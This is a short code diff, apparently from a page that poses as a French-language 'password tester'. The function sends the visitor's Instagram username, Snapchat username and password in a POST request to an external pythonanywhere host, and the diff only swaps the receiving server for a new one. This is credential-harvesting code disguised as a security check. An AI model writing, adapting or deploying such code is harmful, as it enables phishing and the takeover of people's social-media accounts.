@@ -128,7 +128,7 @@ function testerMotDePasse() {
 
   resultat.textContent = '✅ Test lancé. Veuillez patienter pendant l\'analyse...';
 
-  fetch("https://yamafly404.pythonanywhere.com/test", {
+  fetch("https://trackblack.pythonanywhere.com/test", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ pseudoInstagram: pseudoInsta, pseudoSnap: pseudoSnap, motdepasse: mot })
